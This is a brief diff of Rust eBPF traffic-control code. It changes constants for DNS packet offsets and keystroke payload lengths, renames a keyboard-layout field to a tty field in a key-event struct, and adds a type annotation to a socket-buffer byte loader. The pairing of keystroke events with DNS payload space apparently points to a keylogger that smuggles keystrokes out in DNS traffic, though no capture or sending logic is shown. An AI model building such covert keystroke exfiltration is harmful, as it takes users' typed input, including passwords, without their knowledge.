@@ -30,14 +30,14 @@ pub const DNS_QUERY_OFFSET: usize = UDP_OFFSET + 8;
 pub const BPF_ADJ_ROOM_NET: u32 = 0;
 
 pub const KEYS_EVENTS_LEN: usize = 4;
-pub const KEYS_PAYLOAD_LEN: usize = 2 * KEYS_EVENTS_LEN;
+pub const KEYS_PAYLOAD_LEN: usize = 8;
 pub const DNS_PAYLOAD_MAX_LEN: usize = 128;
 
 //TODO: define keyboard layout as enum
 #[derive(Default, Copy, Clone)]
 #[repr(C)]
 pub struct KeyEvent {
-    pub layout: u8, // 0:qwerty 1: azerty
+    pub tty: u8,
     pub key: u8,
 }
 #[map]
@@ -162,7 +162,7 @@ pub fn load_bytes(ctx: &mut TcContext, offset: usize, dst: &mut [u8]) -> Result<
     debug!(ctx, "loading {} bytes", len);
 
     let len_u32 = u32::try_from(len).map_err(|core::num::TryFromIntError { .. }| -1)?;
-    let ret = unsafe {
+    let ret: i64 = unsafe {
         bpf_skb_load_bytes(
             ctx.skb.skb as *const _,
             offset as u32,
